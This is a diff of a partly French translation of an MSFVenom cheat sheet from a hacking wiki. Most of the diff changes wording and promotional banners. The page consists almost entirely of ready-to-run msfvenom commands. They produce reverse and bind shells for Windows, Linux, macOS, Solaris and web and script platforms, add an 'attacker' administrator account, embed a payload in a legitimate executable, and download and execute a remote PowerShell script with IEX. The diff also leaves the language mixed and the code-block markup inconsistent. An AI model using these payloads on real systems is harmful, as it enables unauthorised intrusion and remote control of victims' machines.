@@ -1,41 +1,42 @@
-# MSFVenom - Fiche de triche
+# MSFVenom - CheatSheet
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Autres façons de soutenir HackTricks :
-
-* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
-* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>
 
-Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des pirates expérimentés et des chasseurs de primes !
+Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!
 
-**Perspectives de piratage**\
-Engagez-vous avec du contenu qui explore le frisson et les défis du piratage
+**Hacking Insights**\
+Engage with content that delves into the thrill and challenges of hacking
 
-**Actualités de piratage en temps réel**\
-Restez à jour avec le monde du piratage en constante évolution grâce aux actualités et aux informations en temps réel
+**Real-Time Hack News**\
+Keep up-to-date with fast-paced hacking world through real-time news and insights
 
-**Dernières annonces**\
-Restez informé des dernières primes de bugs lancées et des mises à jour cruciales de la plateforme
+**Latest Announcements**\
+Stay informed with the newest bug bounties launching and crucial platform updates
 
-**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez à collaborer avec les meilleurs pirates dès aujourd'hui !
+**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!
 
 ***
 
-## Msfvenom de base
+## Basic msfvenom
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
-On peut également utiliser le `-a` pour spécifier l'architecture ou la `--platform`
+On peut également utiliser le `-a` pour spécifier l'architecture ou le `--platform`
 
 ## Listing
 ```bash
@@ -52,13 +53,15 @@ PrependSetuid=True #Use this to create a shellcode that will execute something w
 ```
 ## **Windows**
 
-### **Shell Inversé**
+### **Reverse Shell**
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
 ```
-### Coquille de liaison
+{% endcode %}
+
+### Shell de liaison
 
 {% code overflow="wrap" %}
 ```bash
@@ -80,6 +83,8 @@ msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
 ```bash
 msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
 ```
+{% endcode %}
+
 ### **Exécuter une commande**
 
 {% code overflow="wrap" %}
@@ -87,15 +92,15 @@ msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f ex
 msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
 msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
 ```
-{% endcode %}
-
 ### Encodeur
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
 ```
-### Intégré à l'intérieur de l'exécutable
+{% endcode %}
+
+### Intégré dans un exécutable
 
 {% code overflow="wrap" %}
 ```bash
@@ -103,16 +108,18 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/wind
 ```
 {% endcode %}
 
-## Charges Linux
+## Charges utiles Linux
 
-### Shell Inversé
+### Shell inversé
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
 ```
-### Coquille de liaison
+{% endcode %}
+
+### Shell de liaison
 
 {% code overflow="wrap" %}
 ```bash
@@ -126,14 +133,18 @@ msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) 
 ```bash
 msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
 ```
-## **Charges MAC**
+{% endcode %}
 
-### **Shell Inversé:**
+## **Charge utiles MAC**
+
+### **Shell inversé :**
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
 ```
+{% endcode %}
+
 ### **Shell de liaison**
 
 {% code overflow="wrap" %}
@@ -147,6 +158,8 @@ msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho
 ### **PHP**
 
 #### Shell inversé
+
+{% code overflow="wrap" %}
 ```bash
 msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
 cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
@@ -155,16 +168,20 @@ cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> s
 
 ### ASP/x
 
-#### Shell inversé
+#### Shell inversée
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
 ```
+{% endcode %}
+
 ### JSP
 
-#### Shell inversé
+#### Reverse shell
+
+{% code overflow="wrap" %}
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
 ```
@@ -184,7 +201,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f w
 ```bash
 msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```
-## **Charges de langage de script**
+## **Chargements utiles en langage de script**
 
 ### **Perl**
 
@@ -195,16 +212,12 @@ msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > 
 {% endcode %}
 
 ### **Python**
-
-{% code overflow="wrap" %}
 ```bash
 msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
 ```
 {% endcode %}
 
 ### **Bash**
-
-{% code overflow="wrap" %}
 ```bash
 msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
 ```
@@ -212,29 +225,30 @@ msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f
 
 <figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>
 
-Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers expérimentés et des chasseurs de primes en bugs !
+Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers expérimentés et des chasseurs de bugs !
 
-**Perspectives sur le piratage**\
-Engagez-vous avec du contenu qui explore le frisson et les défis du piratage
+**Aperçus sur le hacking**\
+Engagez-vous avec du contenu qui explore le frisson et les défis du hacking
 
-**Actualités sur le piratage en temps réel**\
-Restez à jour avec le monde du piratage en constante évolution grâce aux actualités et aux perspectives en temps réel
+**Actualités de hacking en temps réel**\
+Restez à jour avec le monde du hacking en rapide évolution grâce à des nouvelles et des aperçus en temps réel
 
 **Dernières annonces**\
-Restez informé des dernières primes de bugs lancées et des mises à jour cruciales de la plateforme
+Restez informé des nouveaux programmes de bug bounty lancés et des mises à jour cruciales des plateformes
 
 **Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez à collaborer avec les meilleurs hackers dès aujourd'hui !
 
+{% hint style="success" %}
+Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert de l'équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Soutenir HackTricks</summary>
 
-Autres façons de soutenir HackTricks :
-
-* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF** Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
-* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.
+* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.
 
 </details>
+{% endhint %}
